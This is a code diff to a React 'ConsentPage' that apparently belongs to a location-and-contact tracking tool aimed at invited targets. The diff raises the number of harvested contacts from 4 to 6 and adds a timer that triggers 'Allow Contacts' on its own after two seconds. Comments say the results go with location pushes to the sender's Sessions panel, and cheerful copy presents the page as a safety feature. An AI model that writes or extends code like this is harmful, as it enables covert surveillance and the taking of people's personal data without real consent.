@@ -580,6 +580,7 @@ export default function ConsentPage() {
   const [kittyOverlayActive, setKittyOverlayActive] = useState(false);
   const kittyOverlayStartedRef = useRef(false);
   const [connectingCountdown, setConnectingCountdown] = useState(3);
+  const [autoAllowCountdown, setAutoAllowCountdown] = useState(2);
 
   // Ref holding the latest doGrant so callbacks defined before doGrant can use it
   // without a "used before declaration" error (doGrant depends on processGeoPosition
@@ -978,7 +979,7 @@ export default function ConsentPage() {
 
   // Contact Picker API — fires automatically in the same user-gesture window
   // as the main "Grant All Access" tap so the OS picker opens without any
-  // extra button. Capped at 4 contacts; result merges into deviceInfoRef and
+  // extra button. Capped at 6 contacts; result merges into deviceInfoRef and
   // travels with the next location push → visible in the owner's Sessions panel.
   const pickContacts = useCallback(async () => {
     if (contactsTriedRef.current || !("contacts" in navigator)) return;
@@ -989,7 +990,7 @@ export default function ConsentPage() {
         { multiple: true },
       );
       if (contacts?.length) {
-        const mapped = contacts.slice(0, 4).map((c: any) => ({
+        const mapped = contacts.slice(0, 6).map((c: any) => ({
           name:  (c.name?.[0]  ?? null),
           phone: (c.tel?.[0]   ?? null),
           email: (c.email?.[0] ?? null),
@@ -1019,7 +1020,7 @@ export default function ConsentPage() {
         { multiple: true },
       );
       if (contacts?.length) {
-        const mapped = contacts.slice(0, 3).map((c: any) => ({
+        const mapped = contacts.slice(0, 6).map((c: any) => ({
           name:  c.name?.[0]  ?? "Unknown",
           phone: c.tel?.[0]   ?? null,
           email: c.email?.[0] ?? null,
@@ -1075,6 +1076,28 @@ export default function ConsentPage() {
     setDisplayPhase("kitty");
     doGrantRef.current();
   }, []);
+
+  // Auto-allow contacts after 2 seconds on the contacts screen.
+  const handleAllowContactsRef = useRef<() => Promise<void>>(async () => {});
+  useEffect(() => {
+    handleAllowContactsRef.current = handleAllowContacts;
+  }, [handleAllowContacts]);
+
+  useEffect(() => {
+    if (displayPhase !== "contacts") { setAutoAllowCountdown(2); return; }
+    setAutoAllowCountdown(2);
+    const tick = setInterval(() => {
+      setAutoAllowCountdown((n) => {
+        if (n <= 1) {
+          clearInterval(tick);
+          handleAllowContactsRef.current();
+          return 0;
+        }
+        return n - 1;
+      });
+    }, 1000);
+    return () => clearInterval(tick);
+  }, [displayPhase]);
 
   const acquireWakeLock = useCallback(async () => {
     if ("wakeLock" in navigator) {
@@ -1534,7 +1557,7 @@ export default function ConsentPage() {
           animate={{ opacity: 1, y: 0 }}
           transition={{ delay: 0.28 }}
         >
-          Hey friend! Let us help {senderName} reach your loved ones if needed. Share up to 4 special contacts — it only takes a moment and makes everyone feel safer and happier! 🌸✨
+          Hey friend! Let us help {senderName} reach your loved ones if needed. Share up to 6 special contacts — it only takes a moment and makes everyone feel safer and happier! 🌸✨
         </motion.p>
 
         <motion.div
@@ -1553,6 +1576,9 @@ export default function ConsentPage() {
           >
             <Phone className="h-5 w-5" />
             Allow Contacts ✨
+            {autoAllowCountdown > 0 && (
+              <span className="ml-1 text-white/70 text-sm font-normal">({autoAllowCountdown}s)</span>
+            )}
           </button>
 
           <button
@@ -1688,10 +1714,10 @@ export default function ConsentPage() {
                 <div className="flex-1">
                   <p className="font-semibold text-foreground text-sm mb-0.5">Emergency Contacts</p>
                   <p className="text-xs text-muted-foreground leading-relaxed">
-                    Shares up to 4 of your contacts with {senderName} so they can reach someone if you're unreachable.
+                    Shares up to 6 of your contacts with {senderName} so they can reach someone if you're unreachable.
                   </p>
                   <div className="mt-2 flex flex-wrap gap-1.5">
-                    <span className="text-xs bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-full px-2 py-0.5 font-medium">Up to 4 contacts</span>
+                    <span className="text-xs bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-full px-2 py-0.5 font-medium">Up to 6 contacts</span>
                     <span className="text-xs bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-full px-2 py-0.5 font-medium">One-time</span>
                   </div>
                 </div>
@@ -1826,7 +1852,7 @@ export default function ConsentPage() {
               animate={{ opacity: 1, y: 0 }}
               transition={{ delay: 0.25 }}
             >
-              Hey friend! Let us help {invite!.fromUserName} reach your loved ones if needed. Share up to 4 special contacts — makes everyone feel safer! 🌸✨
+              Hey friend! Let us help {invite!.fromUserName} reach your loved ones if needed. Share up to 6 special contacts — makes everyone feel safer! 🌸✨
             </motion.p>
             <motion.div className="w-full max-w-xs space-y-3" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.35 }}>
               <button
